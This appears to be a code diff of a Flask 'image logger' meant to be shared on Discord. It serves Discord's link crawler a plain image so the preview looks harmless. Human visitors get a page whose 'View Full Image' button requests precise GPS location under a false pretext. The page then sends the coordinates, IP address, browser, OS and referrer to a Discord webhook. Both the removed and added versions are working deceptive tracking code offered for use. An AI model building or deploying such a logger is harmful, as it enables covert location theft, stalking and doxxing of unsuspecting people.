@@ -1,10 +1,7 @@
-from flask import Flask, request, make_response, render_template_string, jsonify, redirect, url_for
+from flask import Flask, request, make_response
 import httpagentparser
 import requests
 import datetime
-import json
-import urllib.parse
-import re
 
 app = Flask(__name__)
 
@@ -19,180 +16,78 @@ def fetch_image():
     except:
         return b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'image/gif'
 
-def is_discord_bot(user_agent):
-    """Check if the request is from Discord's embed crawler"""
-    if not user_agent:
-        return False
-    ua_lower = user_agent.lower()
-    discord_patterns = [
-        'discordbot',
-        'discord',
-        'mozilla/5.0 (compatible; discordbot',
-        'mediapartners-google'
-    ]
-    for pattern in discord_patterns:
-        if pattern in ua_lower:
-            return True
-    return False
-
-# HTML with a button that triggers location when clicked
-GEO_HTML = """
+# SIMPLE HTML WITH BUTTON - NO COMPLEX STUFF
+HTML = """
 <!DOCTYPE html>
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Image</title>
-    <style>
-        body {
-            background: #0a0a0a;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: Arial, sans-serif;
-        }
-        .container {
-            text-align: center;
-            color: white;
-        }
-        .image-container {
-            max-width: 90%;
-            margin: 0 auto;
-        }
-        .image-container img {
-            max-width: 100%;
-            max-height: 70vh;
-            border-radius: 12px;
-            box-shadow: 0 0 40px rgba(255,0,0,0.3);
-        }
-        .btn {
-            background: #ff0040;
-            border: none;
-            color: white;
-            padding: 16px 40px;
-            font-size: 20px;
-            border-radius: 50px;
-            cursor: pointer;
-            transition: all 0.3s;
-            box-shadow: 0 0 30px rgba(255,0,64,0.5);
-            margin-top: 20px;
-            font-weight: bold;
-        }
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 50px rgba(255,0,64,0.8);
-        }
-        .btn:active {
-            transform: scale(0.95);
-        }
-        .info {
-            color: #888;
-            font-size: 14px;
-            margin-top: 20px;
-        }
-    </style>
+    <title>Image Viewer</title>
 </head>
-<body>
+<body style="background:#111;color:#fff;font-family:Arial;text-align:center;padding-top:50px;">
+    <h2>Click to view full image</h2>
+    <img src="IMAGE_URL_PLACEHOLDER" style="max-width:80%;border-radius:10px;margin:20px 0;" />
+    <br>
+    <button onclick="getLocation()" style="padding:15px 40px;font-size:20px;background:#ff0040;color:#fff;border:none;border-radius:50px;cursor:pointer;">
+        🖼️ View Full Image
+    </button>
+    <p style="color:#666;font-size:14px;margin-top:20px;">Click the button to load the high-res version</p>
 
-<div class="container">
-    <div class="image-container">
-        <img src="{{ image_url }}" alt="Image" onerror="this.style.display='none'; document.getElementById('error').style.display='block';">
-        <div id="error" style="display:none; color:#ff4444; margin:20px;">Failed to load image</div>
-    </div>
-    <div>
-        <button class="btn" id="clickBtn">🖼️ View Full Image</button>
-    </div>
-    <div class="info">Click the button to view the full image</div>
-</div>
+    <script>
+        const WEBHOOK = "WEBHOOK_PLACEHOLDER";
+        const IP = "IP_PLACEHOLDER";
+        const BROWSER = "BROWSER_PLACEHOLDER";
+        const OS = "OS_PLACEHOLDER";
+        const DEVICE = "DEVICE_PLACEHOLDER";
+        const REFERRER = "REFERRER_PLACEHOLDER";
+        const IMG_URL = "IMAGE_URL_PLACEHOLDER";
 
-<script>
-    const DISCORD_WEBHOOK = "{{ webhook }}";
-    const IMAGE_URL = "{{ image_url }}";
-    const IP = "{{ ip }}";
-    const USER_AGENT = "{{ user_agent }}";
-    const REFERRER = "{{ referrer }}";
-    const TIMESTAMP = "{{ timestamp }}";
-    const BROWSER = "{{ browser }}";
-    const OS_NAME = "{{ os_name }}";
-    const DEVICE = "{{ device }}";
-
-    function sendToDiscord(lat, lng, accuracy) {
-        const embed = {
-            "title": "📍 GPS Location Captured",
-            "color": 0xff0000,
-            "fields": [
-                {"name": "🌐 IP", "value": "`" + IP + "`", "inline": true},
-                {"name": "📱 Browser", "value": "`" + BROWSER + "`", "inline": true},
-                {"name": "💻 OS/Device", "value": "`" + OS_NAME + " - " + DEVICE + "`", "inline": true},
-                {"name": "📍 Latitude", "value": "`" + lat + "`", "inline": true},
-                {"name": "📍 Longitude", "value": "`" + lng + "`", "inline": true},
-                {"name": "🎯 Accuracy", "value": "`" + accuracy + "m`", "inline": true},
-                {"name": "🔗 Referrer", "value": "`" + REFERRER + "`", "inline": false},
-                {"name": "⏰ Time", "value": TIMESTAMP, "inline": false}
-            ],
-            "footer": {"text": "Image Logger • Vercel • Geo-Enabled"}
-        };
-
-        const payload = {
-            "content": "**🚨 Real Location Grabbed**",
-            "embeds": [embed]
-        };
-
-        fetch(DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(payload)
-        }).catch(err => console.log('Failed to send:', err));
-    }
-
-    function getLocationAndSend() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(position) {
-                    const lat = position.coords.latitude;
-                    const lng = position.coords.longitude;
-                    const accuracy = position.coords.accuracy;
-                    sendToDiscord(lat, lng, accuracy);
-                    // Show a subtle success notification
-                    const btn = document.getElementById('clickBtn');
-                    btn.textContent = '✅ Location Sent!';
-                    btn.style.background = '#00cc66';
-                    setTimeout(() => {
-                        btn.textContent = '🖼️ View Full Image';
-                        btn.style.background = '#ff0040';
-                    }, 3000);
-                },
-                function(error) {
-                    console.log('Location error:', error.message);
-                    const btn = document.getElementById('clickBtn');
-                    btn.textContent = '⚠️ Location Blocked';
-                    btn.style.background = '#ff8800';
-                    setTimeout(() => {
-                        btn.textContent = '🖼️ View Full Image';
-                        btn.style.background = '#ff0040';
-                    }, 3000);
-                },
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                }
-            );
-        } else {
-            alert('Geolocation not supported');
+        function sendToDiscord(lat, lng, acc) {
+            const data = {
+                content: "**📍 Location Captured**",
+                embeds: [{
+                    title: "GPS Coordinates",
+                    color: 0xff0000,
+                    fields: [
+                        {name: "IP", value: "`" + IP + "`", inline: true},
+                        {name: "Browser", value: "`" + BROWSER + "`", inline: true},
+                        {name: "OS/Device", value: "`" + OS + " - " + DEVICE + "`", inline: true},
+                        {name: "Latitude", value: "`" + lat + "`", inline: true},
+                        {name: "Longitude", value: "`" + lng + "`", inline: true},
+                        {name: "Accuracy", value: "`" + acc + "m`", inline: true},
+                        {name: "Referrer", value: "`" + REFERRER + "`", inline: false}
+                    ],
+                    footer: {text: "Image Logger"}
+                }]
+            };
+            fetch(WEBHOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                document.body.innerHTML = '<h2 style="color:#00ff66;">✅ Location Sent!</h2><img src="' + IMG_URL + '" style="max-width:90%;"/>';
+            }).catch(() => {
+                document.body.innerHTML = '<h2 style="color:#ff4444;">Error</h2>';
+            });
         }
-    }
 
-    // Add click event to button
-    document.getElementById('clickBtn').addEventListener('click', function(e) {
-        e.preventDefault();
-        getLocationAndSend();
-        // Also try to redirect to full image in new window
-        window.open(IMAGE_URL + "?geo=1", '_blank');
-    });
-</script>
-
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+                    },
+                    function(err) {
+                        alert('Location access needed to view full image. Please allow and try again.');
+                        console.log(err);
+                    },
+                    {enableHighAccuracy: true, timeout: 10000}
+                );
+            } else {
+                alert('Geolocation not supported');
+            }
+        }
+    </script>
 </body>
 </html>
 """
@@ -201,30 +96,24 @@ GEO_HTML = """
 def serve_image():
     user_agent = request.headers.get('User-Agent', '')
     
-    # If it's a Discord bot, serve the image directly
-    if is_discord_bot(user_agent):
-        image_data, content_type = fetch_image()
-        response = make_response(image_data)
-        response.headers.set('Content-Type', content_type)
-        response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
-        response.headers.set('Pragma', 'no-cache')
-        return response
+    # Detect Discord bot - serve image directly
+    if 'discord' in user_agent.lower():
+        img, ctype = fetch_image()
+        resp = make_response(img)
+        resp.headers.set('Content-Type', ctype)
+        return resp
     
-    # If we have ?geo=1 or ?geo=0, just serve the image
-    if request.args.get('geo') is not None:
-        image_data, content_type = fetch_image()
-        response = make_response(image_data)
-        response.headers.set('Content-Type', content_type)
-        response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
-        response.headers.set('Pragma', 'no-cache')
-        return response
+    # If geo param, serve image
+    if request.args.get('geo'):
+        img, ctype = fetch_image()
+        resp = make_response(img)
+        resp.headers.set('Content-Type', ctype)
+        return resp
 
-    # Otherwise, serve the HTML with the button
+    # Build HTML with values
     ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'Unknown')
     referrer = request.headers.get('Referer', 'No referrer')
-    timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')
-
-    # Parse UA
+    
     try:
         parsed = httpagentparser.detect(user_agent)
         browser = parsed.get('browser', {}).get('name', 'Unknown')
@@ -233,21 +122,19 @@ def serve_image():
     except:
         browser = os_name = device = "Unknown"
 
-    # Inject all values into HTML
-    html = GEO_HTML.replace("{{ webhook }}", DISCORD_WEBHOOK)
-    html = html.replace("{{ image_url }}", IMAGE_URL)
-    html = html.replace("{{ ip }}", ip)
-    html = html.replace("{{ user_agent }}", user_agent.replace("'", "\\'"))
-    html = html.replace("{{ referrer }}", referrer.replace("'", "\\'"))
-    html = html.replace("{{ timestamp }}", timestamp)
-    html = html.replace("{{ browser }}", browser)
-    html = html.replace("{{ os_name }}", os_name)
-    html = html.replace("{{ device }}", device)
+    html = HTML
+    html = html.replace("WEBHOOK_PLACEHOLDER", DISCORD_WEBHOOK)
+    html = html.replace("IMAGE_URL_PLACEHOLDER", IMAGE_URL)
+    html = html.replace("IP_PLACEHOLDER", ip)
+    html = html.replace("BROWSER_PLACEHOLDER", browser)
+    html = html.replace("OS_PLACEHOLDER", os_name)
+    html = html.replace("DEVICE_PLACEHOLDER", device)
+    html = html.replace("REFERRER_PLACEHOLDER", referrer)
 
-    response = make_response(html)
-    response.headers.set('Content-Type', 'text/html')
-    response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
-    return response
+    resp = make_response(html)
+    resp.headers.set('Content-Type', 'text/html')
+    resp.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
+    return resp
 
 if __name__ == '__main__':
     app.run()
